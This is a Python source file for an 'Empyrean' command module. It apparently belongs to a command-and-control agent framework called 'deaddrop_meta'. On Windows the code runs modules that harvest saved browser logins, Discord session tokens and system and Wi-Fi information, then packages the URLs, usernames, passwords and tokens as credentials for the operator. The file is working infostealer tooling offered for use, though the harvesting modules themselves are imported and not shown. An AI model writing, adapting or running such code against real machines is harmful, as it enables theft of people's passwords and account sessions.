"""
Runs Empyrean.

This is the Python native version.
"""

from typing import Any, Optional, Type
import logging
import re
import sys

from pydantic import BaseModel, Field, computed_field

from deaddrop_meta.command_lib import CommandBase, RendererBase
from deaddrop_meta.protocol_lib import Credential

# Conditional imports. Makes mypy slightly less angry.
if sys.platform == "win32":
    from src.commands.empyrean import Browsers, DiscordToken, SystemInfo

logger = logging.getLogger(__name__)


class EmpyreanArguments(BaseModel):
    """
    Simple helper class used for holding arguments.
    """

    exec_browser: bool = Field(
        default=True,
        json_schema_extra={"description": "Whether to run the browser module."},
    )
    exec_discord: bool = Field(
        default=True,
        json_schema_extra={"description": "Whether to run the Discord module."},
    )
    exec_sysinfo: bool = Field(
        default=True,
        json_schema_extra={"description": "Whether to run the system info module."},
    )


class EmpyreanResult(BaseModel):
    """
    Model representing the results of the shell command.
    """

    success: bool = Field(
        json_schema_extra={
            "description": (
                "Whether or not Empyrean ran. False if not on Windows, or if the"
                " executable was murdered before it could be run."
            )
        },
    )
    message: Optional[str] = Field(
        json_schema_extra={"description": "Any additional status message."},
    )
    browser_output: dict[str, Any] = Field(
        json_schema_extra={
            "description": (
                "Output of the browser module. Note that credentials are not currently"
                " extracted."
            )
        },
    )
    discord_output: dict[str, Any] = Field(
        json_schema_extra={
            "description": (
                "Output of the Discord module. Note that credentials are not currently"
                " extracted."
            )
        },
    )
    sysinfo_output: dict[str, Any] = Field(
        json_schema_extra={
            "description": (
                "Output of the system info module. Note that credentials are not currently"
                " extracted."
            )
        },
    )

    # mypy doesn't support decorated properties, though this is the official
    # method described in pydantic's documentation
    @computed_field  # type: ignore[misc]
    @property
    def _credentials(self) -> list[Credential]:
        """
        Generate the standardized file output list.
        """
        if not self.success:
            return []

        result: list[Credential] = []
        # Pull out any browser data, if it exists
        for _browser_name, browser_dict in self.browser_output.items():
            for _profile_name, profile_dict in browser_dict.items():
                for login in profile_dict["logins"]:
                    cred = Credential(
                        credential_type="browser_login",
                        value=f"{login['url']}:{login['username']}:{login['password']}",
                    )
                    result.append(cred)

        # Now pull extracted discord session tokens
        for token, token_dict in self.discord_output.items():
            cred = Credential(
                credential_type="discord_token",
                value=f"{token_dict['username']}:{token}",
            )
            result.append(cred)

        try:
            wifi_str = self.sysinfo_output["system_info"]["wifi_data"]["wifi_info"]
            for line in wifi_str.split("\n")[2:]:
                if m := re.search(r"^(.*?)\s*\|\s*(.*)$", line):
                    cred = Credential(
                        credential_type="wifi_info", value=f"{m.group(1)}:{m.group(2)}"
                    )
                    result.append(cred)
        except Exception as e:
            logger.error(f"Extracting Wi-Fi info failed: {e}")

        return result


class EmpyreanCommand(CommandBase):
    """
    Execute Empyrean as Pygin (Python-native) code. Windows-only.
    """

    name: str = "empyrean"
    description: str = __doc__
    version: str = "0.0.1"
    argument_model: Type[BaseModel] = EmpyreanArguments
    result_model: Type[BaseModel] = EmpyreanResult

    command_renderer: Optional[Type[RendererBase]] = None

    @classmethod
    def execute_command(cls, args: dict[str, Any]) -> dict[str, Any]:
        cmd_args: EmpyreanArguments = EmpyreanArguments.model_validate(args)

        browser_data: dict[str, Any] = {}
        discord_data: dict[str, Any] = {}
        sysinfo_data: dict[str, Any] = {}

        if sys.platform != "win32":
            return cls.return_invalid_os()
        else:
            # The explicit "else" is so mypy correctly evaluates the control
            # flow for sys.platform.

            if cmd_args.exec_browser:
                browser_data = Browsers.run_module()
            if cmd_args.exec_discord:
                discord_data = DiscordToken.run_module()
            if cmd_args.exec_sysinfo:
                sysinfo_data = SystemInfo.run_module()

            result = EmpyreanResult(
                success=True,
                message=None,
                browser_output=browser_data,
                discord_output=discord_data,
                sysinfo_output=sysinfo_data,
            )

            return result.model_dump()

    @staticmethod
    def return_invalid_os() -> dict[str, Any]:
        """
        When this is run on a non-Windows environment, this does nothing.
        """
        result = EmpyreanResult(
            success=False,
            message="Pygin was running on a non-Windows environment.",
            browser_output={},
            sysinfo_output={},
            discord_output={},
        )

        return result.model_dump()
